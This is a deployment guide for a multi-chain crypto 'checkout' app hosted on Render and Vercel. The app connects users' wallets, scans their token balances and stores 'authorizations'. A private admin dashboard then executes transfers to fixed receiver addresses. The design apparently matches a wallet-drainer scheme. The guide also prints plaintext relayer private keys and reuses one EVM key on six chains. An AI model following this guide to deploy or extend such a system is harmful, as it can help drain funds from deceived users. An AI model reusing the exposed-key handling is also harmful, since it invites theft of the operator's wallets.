# Deployment Guide for Your Existing Render + Vercel Setup

## 🎯 Your Current Setup

- **Backend API**: Render.com → `https://checkout-api-wkyo.onrender.com`
- **Frontend**: Vercel → (your existing URL)
- **Admin Dashboard**: Need to deploy to Vercel (separate project)

## ✅ What's Already Configured

✅ `render.yaml` - Updated with all new environment variables
✅ `vercel.json` - Already pointing to your Render backend
✅ `frontend/checkout.js` - Backend URL: `https://checkout-api-wkyo.onrender.com`
✅ `admin-ui/index.html` - Backend URL: `https://checkout-api-wkyo.onrender.com`
✅ Relayer wallets generated and configured

---

## 📋 Step-by-Step Deployment

### Step 1: Update Render Backend (5 minutes)

#### Option A: Push to GitHub (Recommended)
```bash
# Commit your changes
git add .
git commit -m "Update to JIT multi-chain system with PostgreSQL"
git push origin main
```

Render will automatically detect the changes and redeploy!

#### Option B: Manual Environment Variables
If auto-deploy doesn't work, go to your Render dashboard and add these environment variables manually:

**Go to**: https://dashboard.render.com/
**Select**: `checkout-api` service
**Go to**: Environment tab

Add these new variables:
```bash
# Database (if not using auto-created PostgreSQL)
DATABASE_URL=your_postgres_connection_string

# EVM Relayer Keys (all can use the same key)
ETH_RELAYER_KEY=0xe359e4f0b1337f67666111b36a4d0854c4f20960c6c6ae4e355e9111566f91e6
BASE_RELAYER_KEY=0xe359e4f0b1337f67666111b36a4d0854c4f20960c6c6ae4e355e9111566f91e6
POLYGON_RELAYER_KEY=0xe359e4f0b1337f67666111b36a4d0854c4f20960c6c6ae4e355e9111566f91e6
ARBITRUM_RELAYER_KEY=0xe359e4f0b1337f67666111b36a4d0854c4f20960c6c6ae4e355e9111566f91e6
BNB_RELAYER_KEY=0xe359e4f0b1337f67666111b36a4d0854c4f20960c6c6ae4e355e9111566f91e6
OPTIMISM_RELAYER_KEY=0xe359e4f0b1337f67666111b36a4d0854c4f20960c6c6ae4e355e9111566f91e6

# Solana Relayer
SOLANA_RELAYER_PUBKEY=8yR24zo9GeHbVCoiUjzFH283ZeYSU8Bt3WLQ6QqR3g4x

# Tron Relayer
TRON_RELAYER_KEY=4094A440AD67B414C793443F7538C822848AACF7744526F28A6A036538B30467
TRON_RELAYER_ADDRESS=TJYU94egH3n8Vkox647GsnG99mri5JC3Bp

# Receiver addresses (already set)
RECEIVER_ADDRESS=0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9
SOLANA_RECEIVER=HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR
TRON_RECEIVER=TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT

# RPC URLs (already in render.yaml)
ETH_RPC=https://eth.llamarpc.com
BASE_RPC=https://mainnet.base.org
POLYGON_RPC=https://polygon-rpc.com
ARBITRUM_RPC=https://arb1.arbitrum.io/rpc
BNB_RPC=https://bsc-dataseed.bnbchain.org
OPTIMISM_RPC=https://mainnet.optimism.io
```

Click **Save Changes** → Render will redeploy automatically

---

### Step 2: Add PostgreSQL Database on Render (3 minutes)

**Go to**: https://dashboard.render.com/
**Click**: "New +" → "PostgreSQL"

**Configure**:
- Name: `checkout-db`
- Database: `checkout_db`
- User: `checkout_user` (auto-generated)
- Region: Same as your API (probably Oregon)
- Plan: **Free**

**Click**: "Create Database"

**Wait 1-2 minutes** for provisioning...

**Copy the "Internal Database URL"**:
```
postgresql://checkout_user:xxxxx@dpg-xxxxx.oregon-postgres.render.com/checkout_db
```

**Add to your API service**:
1. Go to `checkout-api` service
2. Environment tab
3. Add/Update `DATABASE_URL` with the copied URL
4. Save (Render will auto-redeploy)

---

### Step 3: Deploy Frontend to Vercel (Already done!)

Your frontend is already deployed on Vercel. Just push the changes:

```bash
git add .
git commit -m "Update frontend with new relayer addresses"
git push origin main
```

Vercel will auto-deploy! ✅

**Check deployment**: 
- Go to https://vercel.com/dashboard
- Find your project
- Check deployment logs

---

### Step 4: Deploy Admin Dashboard to Vercel (5 minutes)

You need to deploy the `admin-ui` folder as a **separate** Vercel project.

#### Option A: Deploy via Vercel Dashboard

1. **Go to**: https://vercel.com/new
2. **Import Git Repository**: Select your repo
3. **Configure**:
   - Framework Preset: `Other`
   - Root Directory: **`admin-ui`**
   - Build Command: (leave empty)
   - Output Directory: `.`
4. **Click**: "Deploy"

#### Option B: Deploy via Vercel CLI

```bash
cd admin-ui
npx vercel --prod
```

Follow prompts:
- Project name: `checkout-admin` (or your choice)
- Link to existing project: `N`
- Deploy: `Y`

**Get your admin URL**: `https://checkout-admin-xxxxx.vercel.app`

---

### Step 5: Update Admin URL in Backend (1 minute)

Update the `ADMIN_URL` environment variable in Render:

1. Go to `checkout-api` service on Render
2. Environment tab
3. Update `ADMIN_URL` to your new admin URL
4. Save (auto-redeploys)

---

## 🧪 Testing the Deployment

### Test Backend API
```bash
curl https://checkout-api-wkyo.onrender.com/api/health
```

Expected response:
```json
{"status":"ok","database":"connected"}
```

### Test Frontend
Open your Vercel frontend URL and:
1. Click "Connect Wallet"
2. Should connect to MetaMask/Phantom/TronLink
3. Should scan tokens and show balances

### Test Admin Dashboard
Open your admin dashboard URL:
1. Should show "No pending authorizations" (if database is empty)
2. Try creating an authorization from the frontend
3. Check if it appears in admin dashboard

---

## 🔧 Troubleshooting

### Backend won't start
- Check Render logs: https://dashboard.render.com/ → `checkout-api` → Logs
- Common issues:
  - `DATABASE_URL` not set correctly
  - Missing environment variables
  - PostgreSQL not created

### Database connection error
```
Error: SASL: SCRAM-SERVER-FIRST-MESSAGE
```
**Fix**: Make sure `DATABASE_URL` includes the password:
```
postgresql://user:PASSWORD@host/db
```

### Frontend can't reach backend
**Check**:
1. `frontend/checkout.js` line 39: `BACKEND_URL` is correct
2. Backend is running: `curl https://checkout-api-wkyo.onrender.com/api/health`
3. CORS is enabled (already configured in `server/index.js`)

---

## 📊 Deployment Status Checklist

Use this checklist to track your deployment:

- [ ] Backend updated on Render
- [ ] PostgreSQL database created on Render
- [ ] DATABASE_URL added to backend env vars
- [ ] All relayer keys added to backend env vars
- [ ] Backend is running (health check passes)
- [ ] Frontend redeployed on Vercel
- [ ] Admin dashboard deployed on Vercel (separate project)
- [ ] ADMIN_URL updated in backend env vars
- [ ] Test: Connect wallet on frontend
- [ ] Test: Create authorization
- [ ] Test: View authorization in admin dashboard
- [ ] Test: Execute transfer from admin dashboard

---

## 🚀 Quick Deploy Commands

If everything is set up in Render/Vercel dashboard:

```bash
# Push everything to trigger auto-deploy
git add .
git commit -m "Deploy JIT multi-chain system"
git push origin main

# Both Render and Vercel will auto-deploy!
```

---

## 🎉 Next Steps After Deployment

1. **Test with small amounts first** ($1-10)
2. **Monitor Render logs** for any errors
3. **Check database** for stored authorizations
4. **Test execution flow** from admin dashboard
5. **Share frontend URL** with users
6. **Keep admin URL private** (only for you)

---

## 📞 Support

If you encounter issues:
1. Check Render logs: Dashboard → Service → Logs
2. Check Vercel deployment logs
3. Test API health: `curl https://checkout-api-wkyo.onrender.com/api/health`
4. Verify DATABASE_URL is correct

Your backend: `https://checkout-api-wkyo.onrender.com`
Your Render dashboard: `https://dashboard.render.com/`
Your Vercel dashboard: `https://vercel.com/dashboard`
